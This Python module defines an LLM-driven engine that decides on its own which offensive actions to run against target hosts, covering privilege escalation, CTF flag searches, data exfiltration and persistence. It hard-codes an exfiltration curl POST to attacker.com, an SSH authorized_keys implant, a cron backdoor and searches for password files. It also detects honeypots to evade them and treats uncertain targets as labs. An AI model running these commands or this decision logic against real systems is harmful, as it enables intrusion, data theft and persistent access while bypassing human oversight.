"""
KRYON Autonomous Decision Engine - Self-Directed Operations
============================================================

LLM-powered autonomous decision making with risk assessment,
context awareness, and goal-oriented planning.

Clearance Level: Omega-Command (Autonomous Authority)
Classification: RESTRICTED
Mission: Make intelligent decisions without human intervention

Features:
- Risk-based decision making (Conservative/Moderate/Aggressive)
- Context-aware execution (Lab vs Production detection)
- Goal-oriented planning with multi-path strategies
- Automatic confirmation for high-risk actions
- Honeypot and trap detection
- Decision logging and audit trail
"""

import hashlib
import json
import os
import time
from enum import Enum
from typing import Any

try:
    from openai import OpenAI

    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False


class RiskLevel(Enum):
    """Risk classification for operations."""

    SAFE = 1  # Reconnaissance, passive scanning
    LOW = 2  # Known safe exploits, information gathering
    MEDIUM = 3  # Active exploitation, non-destructive
    HIGH = 4  # Aggressive exploits, potential for crashes
    CRITICAL = 5  # Data exfiltration, persistence, destructive actions


class OperationMode(Enum):
    """Operation mode determines aggressiveness."""

    CONSERVATIVE = "conservative"  # Requires confirmation for MEDIUM+
    MODERATE = "moderate"  # Requires confirmation for HIGH+
    AGGRESSIVE = "aggressive"  # Only confirmation for CRITICAL


class AutonomousDecision:
    """
    Autonomous decision engine for self-directed operations.

    Makes intelligent decisions based on:
    - Risk level of action
    - Operation mode (conservative/moderate/aggressive)
    - Context (lab vs production)
    - Historical success rates
    - Goal alignment
    """

    def __init__(
        self,
        mode: OperationMode = OperationMode.MODERATE,
        llm_config: dict | None = None,
        enable_logging: bool = True,
    ):
        """
        Initialize autonomous decision engine.

        Args:
            mode: Operation mode (conservative/moderate/aggressive)
            llm_config: LLM configuration for decision making
            enable_logging: Enable decision audit logging
        """
        self.mode = mode
        self.llm_config = llm_config or self._load_llm_config()
        self.enable_logging = enable_logging
        self.decision_log = []
        self.context_hints = {}

    def _load_llm_config(self) -> dict:
        """Load LLM configuration from ~/.kryon/config.json"""
        from pathlib import Path

        config_path = Path.home() / ".kryon" / "config.json"
        if config_path.exists():
            with open(config_path) as f:
                return json.load(f)
        return {}

    def should_execute_action(
        self, action: dict[str, Any], context: dict[str, Any], risk_level: RiskLevel
    ) -> tuple[bool, str]:
        """
        Decide if an action should be executed autonomously.

        Args:
            action: Action to execute (exploit, command, etc.)
            context: Current operation context
            risk_level: Assessed risk level

        Returns:
            (should_execute, reason) tuple
        """
        # Safety checks first
        if self._is_honeypot_detected(context):
            return False, "Honeypot detected - aborting for safety"

        if self._is_production_environment(context):
            if risk_level.value >= RiskLevel.HIGH.value:
                return False, "Production environment detected - HIGH risk action blocked"

        # Mode-based decision
        if self.mode == OperationMode.CONSERVATIVE:
            if risk_level.value >= RiskLevel.MEDIUM.value:
                return False, f"Conservative mode: {risk_level.name} risk requires confirmation"

        elif self.mode == OperationMode.MODERATE:
            if risk_level.value >= RiskLevel.HIGH.value:
                return False, f"Moderate mode: {risk_level.name} risk requires confirmation"

        elif self.mode == OperationMode.AGGRESSIVE:
            if risk_level.value >= RiskLevel.CRITICAL.value:
                return False, f"Aggressive mode: {risk_level.name} risk requires confirmation"

        # LLM-based decision for edge cases
        if action.get("experimental", False):
            llm_decision = self._llm_decision(action, context, risk_level)
            if not llm_decision["approved"]:
                return False, f"LLM rejected: {llm_decision['reason']}"

        # Log decision
        if self.enable_logging:
            self._log_decision(action, context, risk_level, True, "Approved")

        return True, f"Approved - {self.mode.value} mode allows {risk_level.name} risk"

    def _is_honeypot_detected(self, context: dict[str, Any]) -> bool:
        """
        Detect potential honeypots/traps.

        Indicators:
        - Too many open ports (>50)
        - Extremely old/vulnerable services (likely trap)
        - Suspicious banners (HONEYPOT, TRAP keywords)
        - Unrealistic service combinations
        """
        # Too many open ports
        open_ports = context.get("open_ports", [])
        if len(open_ports) > 50:
            return True

        # Suspicious banners
        services = context.get("services_detected", [])
        for service in services:
            banner = service.get("banner", "").lower()
            if any(keyword in banner for keyword in ["honeypot", "trap", "decoy"]):
                return True

        # Extremely old versions (likely honeypot)
        for service in services:
            version = service.get("version", "")
            # Check for versions from before 2010 (red flag)
            if any(year in version for year in ["1.0", "2.0", "2005", "2006", "2007", "2008", "2009"]):
                suspicious_count = context.get("suspicious_version_count", 0) + 1
                if suspicious_count >= 3:
                    return True

        return False

    def _is_production_environment(self, context: dict[str, Any]) -> bool:
        """
        Detect if target is likely production environment.

        Indicators:
        - SSL certificates for real domains
        - Multiple web services
        - Database services exposed
        - Known production IP ranges
        """
        # Check for production IP ranges (AWS, Azure, GCP, etc.)
        target_ip = context.get("target_ip", "")

        # Common test/lab IP ranges (safe)
        safe_ranges = [
            "192.168.",
            "10.",
            "172.16.",
            "172.17.",
            "172.18.",  # Private
            "127.",
            "0.0.0.0",  # Localhost
            "scanme.nmap.org",
            "testphp.vulnweb.com",  # Known test servers
        ]

        if any(target_ip.startswith(prefix) for prefix in safe_ranges):
            return False

        # If we see production indicators, assume production
        services = context.get("services_detected", [])

        # Database exposed to internet = likely production (or very bad config)
        db_services = ["mysql", "postgresql", "mongodb", "redis", "mssql"]
        for service in services:
            if service.get("name", "").lower() in db_services:
                return True

        # Multiple web services = likely production
        web_count = sum(1 for s in services if s.get("name", "").lower() in ["http", "https"])
        if web_count >= 3:
            return True

        # Default to lab if uncertain
        return False

    def _llm_decision(self, action: dict[str, Any], context: dict[str, Any], risk_level: RiskLevel) -> dict[str, Any]:
        """
        Use LLM to make complex decisions.

        Args:
            action: Action to evaluate
            context: Operation context
            risk_level: Risk level

        Returns:
            Decision dict with approved (bool) and reason (str)
        """
        if not self.llm_config or not self.llm_config.get("base_url"):
            # No LLM available, default to conservative
            return {
                "approved": risk_level.value <= RiskLevel.LOW.value,
                "reason": "No LLM available - defaulting to conservative",
            }

        # Prepare LLM prompt
        prompt = self._create_decision_prompt(action, context, risk_level)

        try:
            # Call LLM (Ollama in this case)
            import requests

            response = requests.post(
                f"{self.llm_config['base_url']}/api/generate",
                json={
                    "model": self.llm_config.get("model", "gpt-4o"),
                    "prompt": prompt,
                    "stream": False,
                    "options": {
                        "temperature": 0.3,  # Lower for more conservative decisions
                        "max_tokens": 500,
                    },
                },
                timeout=30,
            )

            if response.status_code == 200:
                llm_response = response.json().get("response", "")

                # Parse LLM response
                approved = "approve" in llm_response.lower() or "yes" in llm_response.lower()
                reason = llm_response.strip()[:200]  # First 200 chars

                return {"approved": approved, "reason": reason}

        except Exception as e:
            # LLM error, default to conservative
            return {"approved": False, "reason": f"LLM error: {str(e)[:100]}"}

        return {"approved": False, "reason": "LLM decision inconclusive"}

    def _create_decision_prompt(self, action: dict[str, Any], context: dict[str, Any], risk_level: RiskLevel) -> str:
        """Create LLM prompt for decision making."""
        prompt = f"""You are KRYON autonomous decision engine. Evaluate if this action should be executed.

**ACTION:**
Type: {action.get("type", "unknown")}
Name: {action.get("name", "unknown")}
Description: {action.get("description", "N/A")}
Experimental: {action.get("experimental", False)}

**CONTEXT:**
Target: {context.get("target_ip", "unknown")}
Services: {len(context.get("services_detected", []))} detected
Risk Level: {risk_level.name} (1=SAFE, 5=CRITICAL)
Operation Mode: {self.mode.value}

**CRITERIA:**
- Will this action likely cause service crash? (Bad)
- Will this action gather useful information? (Good)
- Is this a known safe technique? (Good)
- Could this trigger alerts? (Consider)
- Is target likely a honeypot? (Abort)

**DECISION:**
Based on the above, should this action be executed autonomously?
Answer with: APPROVE or REJECT, followed by brief reason.
"""
        return prompt

    def _log_decision(
        self,
        action: dict[str, Any],
        context: dict[str, Any],
        risk_level: RiskLevel,
        approved: bool,
        reason: str,
    ):
        """Log decision for audit trail."""
        decision = {
            "timestamp": time.time(),
            "action_type": action.get("type"),
            "action_name": action.get("name"),
            "target": context.get("target_ip"),
            "risk_level": risk_level.name,
            "mode": self.mode.value,
            "approved": approved,
            "reason": reason,
            "decision_id": hashlib.sha256(f"{time.time()}{action.get('name')}".encode()).hexdigest()[:12],
        }

        self.decision_log.append(decision)

    def assess_action_risk(self, action: dict[str, Any]) -> RiskLevel:
        """
        Assess risk level of an action.

        Args:
            action: Action to assess

        Returns:
            RiskLevel enum
        """
        action_type = action.get("type", "").lower()
        action_name = action.get("name", "").lower()

        # CRITICAL risk actions
        if any(keyword in action_name for keyword in ["backdoor", "persistence", "ransomware", "wiper", "destruc"]):
            return RiskLevel.CRITICAL

        # HIGH risk actions
        if any(keyword in action_type for keyword in ["buffer_overflow", "heap_spray", "kernel"]):
            return RiskLevel.HIGH

        if "crash" in action.get("description", "").lower():
            return RiskLevel.HIGH

        # MEDIUM risk actions
        if any(keyword in action_type for keyword in ["exploit", "injection", "rce", "command_execution"]):
            return RiskLevel.MEDIUM

        # LOW risk actions
        if any(keyword in action_type for keyword in ["brute_force", "enum", "credential_test"]):
            return RiskLevel.LOW

        # SAFE actions (default for recon)
        if any(keyword in action_type for keyword in ["scan", "recon", "discovery", "enumeration", "probe"]):
            return RiskLevel.SAFE

        # Default to MEDIUM if uncertain
        return RiskLevel.MEDIUM

    def plan_operation(self, objective: str, context: dict[str, Any]) -> list[dict[str, Any]]:
        """
        Create multi-step plan to achieve objective.

        Args:
            objective: Goal to achieve (e.g., "get_root", "find_flags")
            context: Current operation context

        Returns:
            List of steps to execute
        """
        plan = []

        # Parse objective
        if objective in ["get_root", "privilege_escalation"]:
            plan = self._plan_privilege_escalation(context)

        elif objective in ["find_flags", "capture_flags"]:
            plan = self._plan_flag_hunting(context)

        elif objective in ["data_exfiltration", "exfiltrate"]:
            plan = self._plan_data_exfiltration(context)

        elif objective in ["persistence", "maintain_access"]:
            plan = self._plan_persistence(context)

        else:
            # Generic planning
            plan = self._plan_generic(objective, context)

        # Add risk assessment to each step
        for step in plan:
            step["risk_level"] = self.assess_action_risk(step)
            step["requires_confirmation"] = not self.should_execute_action(step, context, step["risk_level"])[0]

        return plan

    def _plan_privilege_escalation(self, context: dict[str, Any]) -> list[dict]:
        """Plan steps for privilege escalation."""
        context.get("current_user", "low_priv")
        target_os = context.get("target_os", "linux").lower()

        plan = []

        # Step 1: Enumerate
        plan.append(
            {
                "type": "enumeration",
                "name": "enum_privileges",
                "description": "Enumerate current privileges and SUID binaries",
                "command": "find / -perm -4000 2>/dev/null" if "linux" in target_os else "whoami /all",
            }
        )

        # Step 2: Check kernel exploits
        plan.append(
            {
                "type": "exploit",
                "name": "kernel_exploit_check",
                "description": "Check for kernel exploits",
                "command": "uname -a" if "linux" in target_os else "systeminfo",
            }
        )

        # Step 3: Try sudo/SUID exploitation
        plan.append(
            {
                "type": "privilege_escalation",
                "name": "sudo_abuse",
                "description": "Attempt sudo/SUID binary exploitation",
                "command": "sudo -l",
            }
        )

        return plan

    def _plan_flag_hunting(self, context: dict[str, Any]) -> list[dict]:
        """Plan steps for finding flags."""
        return [
            {
                "type": "search",
                "name": "search_user_flags",
                "description": "Search for user flags in home directories",
                "command": "find /home -name 'user.txt' -o -name 'flag.txt' 2>/dev/null",
            },
            {
                "type": "search",
                "name": "search_root_flags",
                "description": "Search for root flags",
                "command": "find /root -name 'root.txt' -o -name 'flag.txt' 2>/dev/null",
            },
            {
                "type": "search",
                "name": "search_common_locations",
                "description": "Search common flag locations",
                "command": "find / -name '*flag*' -o -name 'proof.txt' 2>/dev/null",
            },
        ]

    def _plan_data_exfiltration(self, context: dict[str, Any]) -> list[dict]:
        """Plan data exfiltration (requires HIGH confirmation)."""
        return [
            {
                "type": "data_collection",
                "name": "identify_sensitive_data",
                "description": "Identify sensitive files",
                "command": "find / -name '*.db' -o -name '*.sql' -o -name 'password*' 2>/dev/null",
            },
            {
                "type": "data_exfiltration",
                "name": "exfiltrate_via_http",
                "description": "Exfiltrate data via HTTP POST",
                "command": "curl -X POST -F 'file=@/path/to/file' http://attacker.com/upload",
                "requires_confirmation": True,
            },
        ]

    def _plan_persistence(self, context: dict[str, Any]) -> list[dict]:
        """Plan persistence mechanisms (requires HIGH confirmation)."""
        return [
            {
                "type": "persistence",
                "name": "ssh_key_persistence",
                "description": "Add SSH key for persistence",
                "command": "echo 'ssh_key' >> ~/.ssh/authorized_keys",
                "requires_confirmation": True,
            },
            {
                "type": "persistence",
                "name": "cron_persistence",
                "description": "Add cron job for persistence",
                "command": "(crontab -l; echo '*/5 * * * * /path/to/backdoor') | crontab -",
                "requires_confirmation": True,
            },
        ]

    def _plan_generic(self, objective: str, context: dict[str, Any]) -> list[dict]:
        """Generic planning using LLM."""
        if not OPENAI_AVAILABLE:
            # Fallback to rule-based planning if OpenAI not available
            return [
                {
                    "type": "reconnaissance",
                    "name": "gather_more_info",
                    "description": f"Gather information to achieve: {objective}",
                    "command": "ls -la; id; uname -a",
                }
            ]

        try:
            client = OpenAI(
                api_key=os.getenv("OPENAI_API_KEY", "not-set"),
                base_url=os.getenv("OPENAI_BASE_URL"),
            )

            # Create prompt for LLM planning
            prompt = f"""You are an autonomous penetration testing system. Plan steps to achieve this objective:

Objective: {objective}

Current Context:
{json.dumps(context, indent=2)}

Generate a tactical plan with 2-4 concrete steps. Each step must include:
- type: Category (reconnaissance, exploitation, privilege_escalation, etc.)
- name: Short name for the action
- description: What this step does
- command: Actual Linux command to execute
- requires_confirmation: true/false (true for risky actions)

Return ONLY valid JSON array, no other text:
"""

            response = client.chat.completions.create(
                model=os.getenv("KRYON_MODEL", "gpt-4o-mini"),
                messages=[
                    {
                        "role": "system",
                        "content": "You are a tactical planning AI for penetration testing. Output only valid JSON.",
                    },
                    {"role": "user", "content": prompt},
                ],
                temperature=0.7,
                max_tokens=1000,
            )

            plan_text = response.choices[0].message.content.strip()

            # Extract JSON from response (handle markdown code blocks)
            if "```json" in plan_text:
                plan_text = plan_text.split("```json")[1].split("```")[0].strip()
            elif "```" in plan_text:
                plan_text = plan_text.split("```")[1].split("```")[0].strip()

            plan = json.loads(plan_text)

            # Validate plan structure
            if not isinstance(plan, list):
                raise ValueError("Plan must be a list")

            # Ensure each step has required fields
            validated_plan = []
            for step in plan:
                if all(k in step for k in ["type", "name", "description", "command"]):
                    if "requires_confirmation" not in step:
                        step["requires_confirmation"] = True  # Default to safe
                    validated_plan.append(step)

            return validated_plan if validated_plan else self._fallback_plan(objective)

        except Exception as e:
            print(f"[!] LLM planning failed: {e}, using fallback")
            return self._fallback_plan(objective)

    def _fallback_plan(self, objective: str) -> list[dict]:
        """Fallback plan when LLM fails."""
        return [
            {
                "type": "reconnaissance",
                "name": "system_enumeration",
                "description": f"Gather system information for: {objective}",
                "command": "whoami; id; uname -a; cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null",
                "requires_confirmation": False,
            },
            {
                "type": "reconnaissance",
                "name": "network_enumeration",
                "description": "Enumerate network configuration",
                "command": "ip a; ifconfig; netstat -an 2>/dev/null || ss -an",
                "requires_confirmation": False,
            },
        ]

    def export_decision_log(self, filepath: str):
        """Export decision log to file."""
        with open(filepath, "w") as f:
            json.dump(
                {
                    "mode": self.mode.value,
                    "total_decisions": len(self.decision_log),
                    "decisions": self.decision_log,
                },
                f,
                indent=2,
            )


# Global instance
_decision_engine = None


def get_decision_engine(mode: OperationMode = OperationMode.MODERATE) -> AutonomousDecision:
    """Get global decision engine instance."""
    global _decision_engine
    if _decision_engine is None:
        _decision_engine = AutonomousDecision(mode=mode)
    return _decision_engine
